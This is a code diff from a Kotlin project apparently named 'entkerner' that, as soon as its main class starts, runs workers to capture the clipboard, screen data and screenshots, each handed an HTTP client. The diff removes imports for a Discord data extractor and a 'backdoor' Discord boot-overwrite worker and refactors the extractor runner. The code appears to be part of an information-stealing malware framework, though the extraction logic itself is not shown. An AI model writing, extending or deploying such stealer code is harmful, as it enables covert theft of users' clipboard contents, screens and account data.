@@ -10,17 +10,11 @@ import kotlinx.serialization.encodeToString
 import kotlinx.serialization.json.Json
 import net.kerner.entkerner.abstract.AbstractDataExtractor
 import net.kerner.entkerner.abstract.get
-import net.kerner.entkerner.backdoor.discord.DiscordBootOverwriteWorker
-import net.kerner.entkerner.extractors.discord.DiscordData
-import net.kerner.entkerner.extractors.discord.DiscordDataWorker
 import net.kerner.entkerner.extractors.screen.ScreenData
 import net.kerner.entkerner.extractors.screen.ScreenExtractionWorker
 import net.kerner.entkerner.extractors.screen.ScreenScreenshotWorker
 import net.kerner.entkerner.extractors.standart.ClipboardExtractionWorker
 import net.kerner.entkerner.model.SystemType
-import java.awt.image.BufferedImage
-import java.io.File
-import kotlin.io.path.pathString
 
 class Entkerner {
     val system = when(System.getProperty("os.name").lowercase()) {
@@ -42,17 +36,16 @@ class Entkerner {
     }
     init {
         runBlocking {
-            val clipboard = runExtractor<String>(ClipboardExtractionWorker(httpClient) as AbstractDataExtractor<Any>)
-            val screenData = runExtractor<List<ScreenData>>(ScreenExtractionWorker(httpClient) as AbstractDataExtractor<Any>)
-            val screenshot = runExtractor<List<String>>(ScreenScreenshotWorker(httpClient) as AbstractDataExtractor<Any>)
+            val clipboard = runExtractor<String>(ClipboardExtractionWorker(httpClient))
+            val screenData = runExtractor<List<ScreenData>>(ScreenExtractionWorker(httpClient))
+            val screenshot = runExtractor<List<String>>(ScreenScreenshotWorker(httpClient))
         }
     }
-    private suspend inline fun <reified V> runExtractor(dataExtractor: AbstractDataExtractor<Any>): V {
+    private suspend inline fun <reified V : Any> runExtractor(dataExtractor: AbstractDataExtractor<*>): V {
         val file = dataExtractor.fileDirectories[system].toFile()
-        val resultT = dataExtractor.extractData(file)
-        val resultV = dataExtractor.handleExtractedData<V>(resultT)
-        println(Json.encodeToString(resultV as V))
-        return resultV as V
+        val result = dataExtractor.run<V>(file)
+        println(Json.encodeToString(result))
+        return result
     }
 }
 
